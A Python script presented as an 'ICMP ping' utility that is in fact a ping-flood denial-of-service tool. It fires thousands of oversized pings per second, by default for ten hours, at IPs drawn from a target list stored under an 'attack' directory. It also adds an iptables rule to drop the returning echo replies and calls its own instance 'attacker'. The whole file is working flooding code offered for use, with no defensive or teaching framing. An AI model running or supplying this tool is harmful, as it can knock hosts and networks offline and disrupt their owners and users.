#!/usr/bin/env python3
"""
ICMP Ping Script (Ignores Replies) - Optimized Timing
Sends ICMP ping requests at precise 1-second intervals while ignoring responses
"""

import asyncio
import subprocess
import time
import argparse
import logging
import json
from pathlib import Path
import platform
import random

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ICMPPing:
    def __init__(self, whitelist_file: str, requests_per_second: int = 2500):
        self.whitelist_file = whitelist_file
        self.requests_per_second = requests_per_second
        self.whitelist_ips: List[str] = []
        self.stats = {
            'total_requests': 0,
            'total_time': 0,
            'batches_sent': 0
        }
        
        # Block ICMP replies at the system level
        self.block_icmp_replies()

    def block_icmp_replies(self):
        """Block incoming ICMP Echo Replies using iptables"""
        if platform.system().lower() == "linux":
            try:
                subprocess.run(
                    ['sudo', 'iptables', '-A', 'INPUT', '-p', 'icmp', '--icmp-type', 'echo-reply', '-j', 'DROP'],
                    check=True
                )
                logger.info("Blocked ICMP Echo Replies using iptables")
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to block ICMP replies: {e}")

    def restore_icmp(self):
        """Restore ICMP Echo Replies"""
        if platform.system().lower() == "linux":
            try:
                subprocess.run(
                    ['sudo', 'iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', 'echo-reply', '-j', 'DROP'],
                    check=True
                )
                logger.info("Restored ICMP Echo Replies")
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to restore ICMP: {e}")

    def load_whitelist(self) -> list[str]:
        """Load whitelisted IPs from file"""
        try:
            with open(self.whitelist_file, 'r') as f:
                content = f.read().strip()
                if content.startswith('[') and content.endswith(']'):
                    self.whitelist_ips = json.loads(content)
                else:
                    self.whitelist_ips = [ip.strip() for ip in content.split('\n') if ip.strip()]
            
            validated_ips = []
            for ip in self.whitelist_ips:
                if ip.startswith(('http://', 'https://')):
                    ip = ip.replace('http://', '').replace('https://', '')
                validated_ips.append(ip)
            
            self.whitelist_ips = validated_ips
            logger.info(f"Loaded {len(self.whitelist_ips)} whitelisted IPs")
            return self.whitelist_ips
            
        except FileNotFoundError:
            logger.error(f"Whitelist file not found: {self.whitelist_file}")
            return []
        except Exception as e:
            logger.error(f"Error loading whitelist: {e}")
            return []

    async def send_ping(self, ip: str):
        """Send single ping request and ignore response"""
        try:
            if platform.system().lower() == "windows":
                cmd = ['ping', '-n', '1', '-w', '100', ip]
            else:
                cmd = ['ping', '-c', '1', '-W', '0.1', '-s', '1032', ip]
            
            await asyncio.create_subprocess_exec(
                *cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception as e:
            logger.debug(f"Error sending ping to {ip}: {e}")

    async def send_batch(self):
        """Send a batch of pings spread across all target IPs"""
        tasks = []
        for _ in range(self.requests_per_second):
            ip = random.choice(self.whitelist_ips)
            tasks.append(self.send_ping(ip))
        
        await asyncio.gather(*tasks)
        self.stats['batches_sent'] += 1
        self.stats['total_requests'] += self.requests_per_second

    async def run(self, duration_seconds: int = 36000):
        """Run the ping flood with precise 1-second intervals"""
        if not self.load_whitelist():
            logger.error("Failed to load whitelist. Exiting.")
            return
        
        logger.info(f"Starting ping flood to {len(self.whitelist_ips)} IPs (ignoring replies)")
        logger.info(f"Configuration: {self.requests_per_second} pings/second")
        
        start_time = time.time()
        next_batch_time = start_time
        
        try:
            while time.time() - start_time < duration_seconds:
                batch_start = time.time()
                
                # Send the batch
                await self.send_batch()
                
                # Calculate time taken and adjust next batch time
                batch_duration = time.time() - batch_start
                next_batch_time += 1.0  # Exactly 1 second after previous batch should have started
                
                # Calculate sleep time needed to maintain 1-second intervals
                current_time = time.time()
                sleep_time = next_batch_time - current_time
                
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
                else:
                    logger.warning(f"Batch took too long: {batch_duration:.3f}s (can't maintain 1s interval)")
                    
                # Log progress every 60 seconds
                if self.stats['batches_sent'] % 60 == 0:
                    elapsed = time.time() - start_time
                    logger.info(f"Progress: {elapsed:.1f}s | Batches: {self.stats['batches_sent']} | Total Pings: {self.stats['total_requests']}")
                    
        except KeyboardInterrupt:
            logger.info("Stopped by user")
        finally:
            self.restore_icmp()
            self.print_stats(time.time() - start_time)

    def print_stats(self, total_time: float):
        """Print statistics"""
        logger.info("\nFinal Statistics:")
        logger.info(f"Total Pings Sent: {self.stats['total_requests']}")
        logger.info(f"Total Duration: {total_time:.2f}s")
        logger.info(f"Average Rate: {self.stats['total_requests']/total_time:.2f} pings/sec")
        logger.info(f"Requested Rate: {self.requests_per_second} pings/sec")
        logger.info(f"Efficiency: {(self.stats['total_requests']/(total_time * self.requests_per_second))*100:.2f}%")

async def main():
    parser = argparse.ArgumentParser(description='Ping flood while ignoring replies')
    parser.add_argument('--whitelist', default='./attack/white_list.txt', help='Whitelist file path')
    parser.add_argument('--duration', type=int, default=36000, help='Duration in seconds')
    parser.add_argument('--rps', type=int, default=2500, help='Requests per second')
    args = parser.parse_args()
    
    if not Path(args.whitelist).exists():
        logger.error(f"Whitelist file not found: {args.whitelist}")
        return
    
    attacker = ICMPPing(
        whitelist_file=args.whitelist,
        requests_per_second=args.rps
    )
    
    await attacker.run(duration_seconds=args.duration)

if __name__ == "__main__":
    asyncio.run(main())